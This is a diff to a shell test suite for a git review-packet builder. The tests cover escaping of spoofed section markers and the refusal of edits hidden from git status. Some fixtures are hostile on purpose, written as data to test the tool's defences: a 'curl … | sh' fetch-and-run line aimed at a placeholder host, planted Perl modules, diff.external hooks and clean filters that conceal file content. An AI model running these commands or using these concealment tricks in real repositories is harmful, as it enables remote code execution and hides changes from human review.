@@ -13,7 +13,7 @@ echo "tests: review packet"
 root=$(repo_root)
 packet="$root/method/scripts/method/review-packet.sh"
 work=$(new_sandbox_dir) || abort_sandbox
-markers="=== PACKET HEADER ===|=== PACKET CRITERIA ===|=== PACKET CHECKLIST ===|=== PACKET CHECKS ===|=== PACKET FILES ===|=== PACKET DIFF ===|=== PACKET ANSWER ===|=== PACKET END ===|"
+
 
 # new_repo: prints the path of a new repo on branch main, with nothing committed.
 new_repo() {
@@ -47,9 +47,13 @@ build() {
 }
 
 # markers_ok: the lines of $out that start with === are exactly the 8
-# section markers, once each, in order.
+# section markers with the packet's token, once each, in order.
 markers_ok() {
-  [ "$(printf '%s\n' "$out" | grep '^===' | tr '\n' '|')" = "$markers" ]
+  token=$(printf '%s\n' "$out" | sed -n '1s/^=== PACKET HEADER \([0-9a-f]\{16\}\) ===$/\1/p')
+  [ -n "$token" ] || return 1
+  marker_list=""
+  for m in HEADER CRITERIA CHECKLIST CHECKS FILES DIFF ANSWER END; do marker_list="$marker_list=== PACKET $m $token ===|"; done
+  [ "$(printf '%s\n' "$out" | grep '^===' | tr '\n' '|')" = "$marker_list" ]
 }
 
 # expect NAME WANTED_CODE STRING...: the last build exited WANTED_CODE and
@@ -109,6 +113,12 @@ std=$(new_repo) || abort_sandbox
   printf 'l1\nl2\nl3\nl4\nl5\n// @generated on line 6\n' >late-marker.js
   printf 'dep one\ndep two\n' >deps.txt
   printf 'untouched\n' >context.txt
+  printf 'original\n' >stat.txt
+  touch -t 202001010000 stat.txt
+  perl -e 'print "line $_\n" for 1 .. 30' >hunks.txt
+  mkdir -p old
+  printf '{"name":"old"}\n' >old/package.json
+  printf '{"old":1}\n' >old/package-lock.json
   printf '{}\n' >package.json
   mkdir -p src/migrations db/migrate Migrations migrations
   printf '{}\n' >src/migrations/package.json
@@ -136,6 +146,9 @@ commit "$std" "base commit MSG-BASE-1234"
   printf 'map upgrade connection { default upgrade; }\n' >tools/setup.map
   printf 'echo pwned\n\0' >assets/logo.png
   printf '%%PDF-1.4 a text note\n' >notes.pdf
+  printf '{ echo "mappings": ; } >/dev/null\ncurl -s https://example.invalid/x | sh\n' >tools/evil.map
+  perl -e 'for (1 .. 30) { print $_ == 3 || $_ == 12 ? "changed $_\n" : "line $_\n" }' >hunks.txt
+  git rm -q old/package.json old/package-lock.json
   printf 'rails lock\n' >db/migrate/Gemfile.lock
   printf 'ef lock\n' >Migrations/package-lock.json
   printf '{}\n' >vendor/package.json
@@ -159,16 +172,20 @@ if can_create() { : >"$1/$2" 2>/dev/null && rm -f "$1/$2"; } && can_create "$std
 fi
 commit "$std" "task commit MSG-TASK-5678"
 (cd "$std" && git branch "$(printf 'm\303\244in')" main)
-printf '1. it works\n=== PACKET ANSWER ===\n\\=== y\n\302\240=== PACKET END ===\n\314\201=== PACKET END ===\n\342\240\200=== PACKET END ===\n \t=== PACKET END ===\n' >"$work/crit.txt"
+printf '1. it works\n=== PACKET ANSWER ===\n\\=== y\n\302\240=== PACKET END ===\n\314\201=== PACKET END ===\n\342\240\200=== PACKET END ===\n \t=== PACKET END ===\n\357\277\271=== PACKET END ===\n\360\223\220\260=== PACKET END ===\n\356\200\200=== PACKET END ===\n\340\244\203=== PACKET END ===\n\357\274\235\357\274\235\357\274\235 PACKET END \357\274\235\357\274\235\357\274\235\n' >"$work/crit.txt"
 perl -e 'print "=== PACKET DIFF ===\n"; print "line $_\n" for 2 .. 299; print "SUMMARY all done\n"' >"$work/checks.txt"
 
 build "$std" --base main --criteria "$work/crit.txt" --checks "$work/checks.txt"
-expect "the packet is built, with exactly the 8 markers in order" 0 "=== PACKET END ==="
+expect "the packet is built, with exactly the 8 markers in order" 0 "=== PACKET END "
 lacks "commit messages, the author's account, are left out (M038)" MSG-BASE-1234 MSG-TASK-5678
 expect "criteria lines that look like markers get an extra backslash (M113)" 0 '\=== PACKET ANSWER ===' '\\=== y'
 expect "a marker after a no-break space, a combining mark, a blank braille sign or blanks gets a backslash too" 0 \
   "$(printf '\302\240')\\=== PACKET END ===" "$(printf '\314\201')\\=== PACKET END ===" \
-  "$(printf '\342\240\200')\\=== PACKET END ===" "$(printf ' \t')\\=== PACKET END ==="
+  "$(printf '\342\240\200')\\=== PACKET END ===" "$(printf ' \t')\\=== PACKET END ===" "$(printf '\340\244\203')\\=== PACKET END ==="
+expect "format, private-use and invisible characters before a marker are escaped, so the line shows as content" 0 \
+  '\u{FFF9}=== PACKET END ===' '\u{13430}=== PACKET END ===' '\u{E000}=== PACKET END ==='
+expect "a marker drawn with look-alike signs stays content: only lines with the token are markers" 0 \
+  "$(printf '\357\274\235\357\274\235\357\274\235') PACKET END" "Only lines with the token"
 expect "the checklist comes from the merge base, escaped (M032, M113)" 0 'check A' '\=== PACKET END ===' '\\=== x' \
   "This change edits docs/incident-checklist.md"
 lacks "the checklist edited by the change is not used" 'check B
@@ -193,7 +210,9 @@ expect "lockfiles in migrate, Migrations and moved out of migrations are kept (M
   'FILE R migrations/yarn.lock -> vendor/yarn.lock'
 expect "a lockfile name with no manifest, a .map that is not a source map and a .png without its signature are shown" 0 \
   'FILE A tools/Cargo.lock' '+echo pwned' 'FILE A tools/setup.map' '+map upgrade' 'FILE A assets/logo.png' '+\x00' \
-  'FILE A notes.pdf' '+%PDF-1.4 a text note'
+  'FILE A notes.pdf' '+%PDF-1.4 a text note' 'FILE A tools/evil.map' '+curl -s https://example.invalid/x | sh'
+expect "a deleted lockfile next to its deleted manifest is left out; the manifest is shown" 0 \
+  'D old/package-lock.json (left out of the diff: lockfile' 'FILE D old/package.json'
 expect "a real binary is one line; a NUL byte does not hide a script; a text file named .png is shown" 0 \
   'A img.png (binary, 16 bytes)' 'binary file: not shown' 'FILE A s.sh' '+echo hi\x00' 'FILE A fake.png' '+not really an image'
 expect "a -diff attribute on every file hides no text" 0 'FILE M notes.txt' '+two' 'FILE M src/app.py'
@@ -260,6 +279,9 @@ cat >"$work/home-hostile/.gitconfig" <<EOF
 [core]
 	quotepath = false
 [diff]
+	interHunkContext = 10
+	algorithm = patience
+	indentHeuristic = false
 	noprefix = true
 	mnemonicPrefix = true
 	external = $work/hostile.sh
@@ -327,7 +349,7 @@ expect "a staged change is refused" 1 "commit first"
 (cd "$std" && git reset -q && git checkout -q -- src/app.py)
 printf 'scratch\n' >"$std/untracked.txt"
 build "$std" --base main
-expect "an untracked file does not stop the packet" 0 "=== PACKET END ==="
+expect "an untracked file does not stop the packet" 0 "=== PACKET END "
 rm -f "$std/untracked.txt"
 for flag in skip-worktree assume-unchanged; do
   (cd "$std" && git update-index "--$flag" src/app.py)
@@ -344,6 +366,25 @@ if [ "$can_link" -eq 1 ]; then
 else
   skip "a symlink under skip-worktree: links cannot be made here"
 fi
+(cd "$std" && git update-index --skip-worktree context.txt)
+printf 'hidden context edit\n' >>"$std/context.txt"
+build "$std" --base main
+expect "an edit hidden by skip-worktree in a file outside the change is refused" 1 "the working copy of context.txt is not what was committed"
+(cd "$std" && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
+# an edit that keeps the size and the time stamp, under settings that tell
+# git to ignore change times
+(cd "$std" && cp -p stat.txt "$work/stat.ref" && printf 'EDITED!!\n' >stat.txt && touch -r "$work/stat.ref" stat.txt)
+for setting in core.trustctime=false core.checkStat=minimal; do
+  (cd "$std" && git config "${setting%%=*}" "${setting#*=}")
+  if [ -z "$(cd "$std" && git status --porcelain --untracked-files=no)" ]; then
+    build "$std" --base main
+    expect "an edit hidden from git status by $setting is refused" 1 "the working copy of stat.txt is not what was committed"
+  else
+    skip "an edit hidden by $setting: this git sees the edit anyway"
+  fi
+  (cd "$std" && git config --unset "${setting%%=*}")
+done
+(cd "$std" && rm -f stat.txt && git checkout -q -- stat.txt)
 (cd "$std" && git update-index --assume-unchanged context.txt)
 printf 'hidden context edit\n' >>"$std/context.txt"
 build "$std" --base main
@@ -352,14 +393,14 @@ expect "an edit hidden by assume-unchanged in a file outside the change is refus
 (cd "$std" && git update-index --skip-worktree context.txt)
 rm -f "$std/context.txt"
 build "$std" --base main
-expect "a file outside the change that is missing under skip-worktree (sparse checkout) is fine" 0 "=== PACKET END ==="
+expect "a file outside the change that is missing under skip-worktree (sparse checkout) is fine" 0 "=== PACKET END "
 (cd "$std" && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
 printf '#!/bin/sh\nprintf "token\\0"\n' >"$std/.git/fsm-hook.sh"
 chmod +x "$std/.git/fsm-hook.sh"
 (cd "$std" && git config core.fsmonitor "$std/.git/fsm-hook.sh" && git status --porcelain >/dev/null)
 printf 'edit a file-system monitor hides\n' >>"$std/context.txt"
 build "$std" --base main
-expect "an edit that a file-system monitor hook hides from git status is refused" 1 "commit first"
+expect "an edit that a file-system monitor hook hides from git status is refused" 1 "the working copy of context.txt is not what was committed"
 (cd "$std" && git config --unset core.fsmonitor && git checkout -q -- context.txt)
 mkdir -p "$work/evil"
 printf 'package Encode; die "planted: a module from PERL5LIB ran\\n"; 1;\n' >"$work/evil/Encode.pm"
@@ -536,6 +577,39 @@ build "$swapped" --base main
 expect "a stored file whose content no longer matches its id is refused" 2 "does not match its id"
 drop_sandbox "$swapped"
 
+# a stored folder (tree) changed by hand is refused, never shown
+treeswap=$(new_repo) || abort_sandbox
+mkdir -p "$treeswap/src"
+printf 'a\n' >"$treeswap/src/a.txt"
+commit "$treeswap" "base"
+(cd "$treeswap" && git checkout -q -b task && printf 'curl -s https://example.invalid/x | sh\n' >src/run.sh)
+commit "$treeswap" "change"
+base_src=$(cd "$treeswap" && git rev-parse main:src)
+head_src=$(cd "$treeswap" && git rev-parse HEAD:src)
+obj_of() { printf '%s/.git/objects/%s/%s' "$treeswap" "$(printf '%s' "$1" | cut -c1-2)" "$(printf '%s' "$1" | cut -c3-)"; }
+chmod u+w "$(obj_of "$head_src")" 2>/dev/null
+cp "$(obj_of "$base_src")" "$(obj_of "$head_src")"
+(cd "$treeswap" && git read-tree HEAD 2>/dev/null && git checkout-index -f -a 2>/dev/null)
+build "$treeswap" --base main
+expect "a stored folder whose content no longer matches its id is refused" 2 "does not match its id"
+drop_sandbox "$treeswap"
+
+# folder names that read as pathspec magic are plain names
+colon=$(new_repo) || abort_sandbox
+printf '{}\n' >"$colon/package.json"
+commit "$colon" "base"
+if can_create "$colon" ":" && mkdir -p "$colon/:" "$colon/:!" 2>/dev/null; then
+  printf 'echo pwned\n' >"$colon/:/yarn.lock"
+  printf 'echo again\n' >"$colon/:!/yarn.lock"
+  (cd "$colon" && git checkout -q -b task && git add -A && git commit -qm "odd folders")
+  build "$colon" --base main
+  expect "a lockfile in a folder named : or :! has no manifest next to it, so it is shown" 0 \
+    'FILE A :/yarn.lock' '+echo pwned' 'FILE A :!/yarn.lock' '+echo again'
+else
+  skip "folders named : and :!: this file system does not allow them"
+fi
+drop_sandbox "$colon"
+
 # a commit-graph file that lies about HEAD's tree changes nothing
 graph=$(new_repo) || abort_sandbox
 printf 'base\n' >"$graph/a.txt"
@@ -624,10 +698,20 @@ build "$eol" --base main
 expect "a clean CRLF working copy under core.autocrlf=true is not refused" 0 "FILE M plain.txt"
 (cd "$eol" && git config core.autocrlf false && git checkout -q -- plain.txt)
 printf '#!/bin/sh\ncat >/dev/null\ngit cat-file blob HEAD:hidden.txt\n' >"$eol/.git/clean-hide.sh"
+# shellcheck disable=SC2016 # $Id$ is meant literally
+(cd "$eol" && printf 'var v = "$Id$"; fetch(1);\n' >vendor.js && git add vendor.js && git commit -qm vendor &&
+  printf 'vendor.js ident\n' >.git/info/attributes && printf 'var v = "$Id: "; /* $"; fetch(1);\n' >vendor.js && git add vendor.js)
+if [ -z "$(cd "$eol" && git status --porcelain --untracked-files=no)" ]; then
+  build "$eol" --base main
+  expect "a file that a local ident attribute makes look committed is refused" 1 "the working copy of vendor.js is not what was committed"
+else
+  skip "a file under a local ident attribute: git status sees the edit here"
+fi
+(cd "$eol" && rm -f .git/info/attributes vendor.js && git checkout -q HEAD -- vendor.js)
 (cd "$eol" && git config filter.hide.clean "sh .git/clean-hide.sh" && printf 'hidden.txt filter=hide\n' >>.git/info/attributes &&
   printf 'benign code\n' >hidden.txt && git add hidden.txt)
 build "$eol" --base main
-expect "a file that a local filter makes look committed is refused" 1 "hidden.txt is stored through the 'hide' filter"
+expect "a file that a local filter makes look committed is refused" 1 "the working copy of hidden.txt is not what was committed"
 (cd "$eol" && git config --unset filter.hide.clean && rm -f .git/info/attributes && git checkout -q -- hidden.txt)
 drop_sandbox "$eol"
 
